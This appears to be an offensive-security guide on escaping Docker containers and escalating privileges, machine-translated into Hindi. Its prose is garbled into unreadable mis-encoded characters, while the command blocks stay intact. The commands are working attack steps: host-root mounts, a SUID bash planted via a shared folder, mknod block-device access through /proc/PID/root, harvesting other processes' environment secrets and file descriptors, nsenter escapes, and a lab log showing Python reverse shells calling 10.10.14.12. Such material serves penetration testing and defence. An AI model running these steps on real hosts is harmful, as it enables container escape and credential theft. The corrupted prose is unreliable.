#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдХ рднрд╛рдЧ рднрд╛рд░реА рдорд╛рдЙрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдХрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдорд╛рдЙрдВрдЯ рдХреА рдЧрдИ рд╣реЛрдВ рдЬреЛ **рдореЗрдЬрд╝рдмрд╛рди рдХреЗ рддрд╣рдд рдХреА рдЬрд╛рдирдХрд╛рд░реА** рджреЗрддреА рд╣реИрдВред рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдРрд╕реА рднреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ **рдХреБрдЫ рд╣реЛрдиреЗ рдкрд░ рдореЗрдЬрд╝рдмрд╛рди рджреНрд╡рд╛рд░рд╛ рдХреБрдЫ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИрдВ** (рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА)ред\
рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдпрд╣ рд╕рдВрднрд╡ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐:

* release\_agent (рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ **рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ** рднреА рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### рдордирдорд╛рдиреА рдорд╛рдЙрдВрдЯ

рдХрдИ рдЕрд╡рд╕рд░реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдпрд╣ рдкрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ **рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдореЗрдЬрд╝рдмрд╛рди рд╕реЗ рдХреБрдЫ рд╡реЙрд▓реНрдпреВрдо рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдпрджрд┐ рдпрд╣ рд╡реЙрд▓реНрдпреВрдо рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдЖрдкрдХреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ** рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ: рд░рд╣рд╕реНрдп рдкрдврд╝реЗрдВ, рдПрд╕рдПрд╕рдПрдЪ рдЕрдзрд┐рдХреГрдд\_рдХреБрдВрдЬрд┐рдпрд╛рдБ рдмрджрд▓реЗрдВ...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 рд╢реИрд▓реНрд╕ рдФрд░ рд╣реЛрд╕реНрдЯ рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣реБрдВрдЪ** рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреБрдЫ рдлреЛрд▓реНрдбрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рд╣реБрдЖ рд╣реИ рдФрд░ рдЖрдкрдиреЗ **рдЧреИрд░-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрд╕реНрдЯ рдкрд░ рдмрдЪ рдирд┐рдХрд▓рд╛** рд╣реИ рдФрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдлреЛрд▓реНрдбрд░ рдкрд░ рдкрдврд╝рдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИред\
рдЖрдк **рдХрдВрдЯреЗрдирд░** рдХреЗ рдЕрдВрджрд░ **рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдлреЛрд▓реНрдбрд░** рдореЗрдВ **рдПрдХ рдмреИрд╢ suid рдлрд╝рд╛рдЗрд▓** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╣реЛрд╕реНрдЯ рд╕реЗ рдЗрд╕реЗ рдирд┐рд╖реЗрдзрд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 рд╢реИрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЗрд╕реНрдХреЗрд▓реЗрд╢рди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕** рд╣реИ рдФрд░ рдЖрдкрдиреЗ **рдЧреИрд░-рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрд╕реНрдЯ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд▓рд┐рдпрд╛ рд╣реИ**, рддреЛ рдЖрдк рджреЛрдиреЛрдВ рд╢реИрд▓реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЗрд╕реНрдХреЗрд▓реЗрд╢рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ MKNOD рдХреНрд╖рдорддрд╛ рд╣реИ (рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИ) рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)ред\
рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрддреА рд╣реИред рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬреЛ **рдЕрдВрдбрд░рд▓рд╛рдЗрдВрдЧ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдФрд░ рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, /dev/sda рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдбрд┐рд╕реНрдХ рдкрд░ **рд░реЙ рдбреЗрдЯрд╛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рджреЗрддреА рд╣реИред

рдбреЙрдХрд░ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕рдВрд░рдХреНрд╖рд┐рдд рд░рд╣рддрд╛ рд╣реИ рдЬреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ cgroup рдиреАрддрд┐ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдХреЗ **рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ рдХреЗ рдСрдкрд░реЗрд╢рди рдмреНрд▓реЙрдХ рдХрд░рддрд╛ рд╣реИ**ред рдлрд┐рд░ рднреА, рдпрджрд┐ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ **рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдпрд╣ рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░ **/proc/PID/root/** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдБрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдкрд╣реБрдБрдЪ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рджреЛрдиреЛрдВ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдФрд░ рдмрд╛рд╣рд░ рд╕рдорд╛рди рд╣реЛрдВ**ред

рдЗрд╕ [**рд▓реЗрдЦрди**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) рд╕реЗ **рд╢реЛрд╖рдг** рдЙрджрд╛рд╣рд░рдг:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

рдпрджрд┐ рдЖрдк рдореЗрдЬрд╝рдмрд╛рди рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЙрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЯреЗрд╕реНрдЯ рд▓реИрдм рдЪрд▓рд╛рдПрдБ:
```
docker run --rm -it --pid=host ubuntu bash
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк `ps auxn` рдЬреИрд╕реА рдХреБрдЫ рдЪреАрдЬреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХреЗрдВрдЧреЗ рдФрд░ рдХрдорд╛рдВрдб рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХреЗрдВрдЧреЗред

рдлрд┐рд░, рдЬреИрд╕реЗ рд╣реА рдЖрдк **/proc/ рдореЗрдВ рдореЗрдЬрдмрд╛рди рдХреА рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдЙрдирдХреЗ env рдЧреБрдкреНрдд рд░рд╣рд╕реНрдп рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
рдЖрдк рднреА **рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреА рдУрдкрди рдлрд╝рд╛рдЗрд▓реНрд╕ рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
рдЖрдк рднреА **рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдорд╛рд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреАрдУрдПрд╕ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдХреБрдЫ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ `nsenter --target <pid> --all` рдпрд╛ `nsenter --target <pid> --mount --net --pid --cgroup` рдЬрд┐рд╕рд╕реЗ рдЖрдк **рдПрдХ рд╢реИрд▓ рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХреЛрдИ ns рдкреНрд░рддрд┐рдмрдВрдзрди рдирд╣реАрдВ рд╣реИ** (рдЖрд╢рд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рдирд╣реАрдВ рд╣реИ)ред
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
рдпрджрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ рдбреЙрдХрд░ [рд╣реЛрд╕реНрдЯ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдбреНрд░рд╛рдЗрд╡рд░ (`--network=host`)](https://docs.docker.com/network/host/) рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рдЙрд╕ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдЯреИрдХ рдбреЙрдХрд░ рд╣реЛрд╕реНрдЯ рд╕реЗ рдЕрд▓рдЧ рдирд╣реАрдВ рд╣реИ (рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рддрд╛ рд╣реИ), рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рдЕрдкрдирд╛ рдЖрдИрдкреА-рдкрддрд╛ рдирд╣реАрдВ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, **рдХрдВрдЯреЗрдирд░ рд╕рднреА рд╕реЗрд╡рд╛рдПрдВ рд╕реАрдзреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рдЖрдИрдкреА рдкрд░ рдмрд╛рдЗрдВрдб рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдХрдВрдЯреЗрдирд░ **рд╣реЛрд╕реНрдЯ** рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рд╣реИ рд╕рднреА рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ **рдЕрдВрддрд░реНрдЧреНрд░рд╣рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕рд╛рдЭрд╛ рдЗрдВрдЯрд░рдлреЗрд╕ `tcpdump -i eth0` рдкрд░ рд╣реИ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реЛрд╕реНрдЯ рдФрд░ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдмреАрдЪ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдФрд░ рд╕реНрдкреВрдлрд╝** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ:

* [рд▓реЗрдЦ: Google SRE рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХреИрд╕реЗ рдХрд░реЗрдВ: рдХреНрд▓рд╛рдЙрдб SQL рдореЗрдВ рд╢реИрд▓ рдбреНрд░реЙрдк рдХрд░рдирд╛](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕реЗрд╡рд╛ MITM рджреНрд╡рд╛рд░рд╛ рд░реВрдЯ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

рдЖрдкрдХреЛ рдпрд╣рд╛рдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рднреА рд╣реЛрдЧреА **рд╣реЛрд╕реНрдЯ рдпрд╛ рддреЛ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдмрд╛рдЗрдВрдб рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ рддрдХ** рдпрд╛ рдлрд┐рд░ **рдиреЛрдб рдХреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рддрдХ** (рдЬреЛ рдПрдХ рдХрдВрдЯреЗрдирд░ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреА рд╣реИ)ред

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
рдЬрдм `hostIPC=true` рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдореЗрдЬрд╝рдмрд╛рди рдХреЗ рдЗрдВрдЯрд░-рдкреНрд░реЛрд╕реЗрд╕ рдХрдореНрдпреВрдирд┐рдХреЗрд╢рди (IPC) рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ **рд╕рд╛рдЭрд╛ рд╕реНрдореГрддрд┐** `/dev/shm` рдореЗрдВред рдЗрд╕рд╕реЗ рдпрд╣ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЙрдиреА IPC рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдЬреЛ рдЕрдиреНрдп рдореЗрдЬрд╝рдмрд╛рди рдпрд╛ рдкреЙрдб рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реЛрдВред `ipcs` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрди IPC рддрдВрддреНрд░реЛрдВ рдХреА рдЕрдзреНрдпрдпрди рдХрд░реЗрдВред

* **/dev/shm рдХреА рдЬрд╛рдВрдЪ** - рдЗрд╕ рд╕рд╛рдЭрд╛ рд╕реНрдореГрддрд┐ рд╕реНрдерд╛рди рдореЗрдВ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: `ls -la /dev/shm`
* **рдореМрдЬреВрджрд╛ IPC рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ** - рдЖрдк `/usr/bin/ipcs` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ IPC рд╕реБрд╡рд┐рдзрд╛рдПрдБ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИрдВред рдЗрд╕реЗ рдЬрд╛рдВрдЪреЗрдВ: `ipcs -a`

### рдХреНрд╖рдорддрд╛рдПрдБ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдпрджрд┐ рд╕рд┐рд╕реНрдХреЙрд▓ **`unshare`** рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛ рдХрд░ рд╕рднреА рдХреНрд╖рдорддрд╛рдПрдБ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рд┐рдореНрд▓рд┐рдВрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдкреЛрд╕реНрдЯ [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) рдореЗрдВ рд╕рдордЭрд╛рдИ рдЧрдИ рджреВрд╕рд░реА рддрдХрдиреАрдХ рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдЖрдк рдпреВрдЬрд░ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдВрдб рдорд╛рдЙрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдореЗрдЬрдмрд╛рди рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓ рд╕рдХреЗрдВ (рдЙрд╕ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓реЗ рдореЗрдВ, рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ)ред

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрд▓реНрдб рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдирд┐рд░реНрдорд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ (CVE-2019-5736)

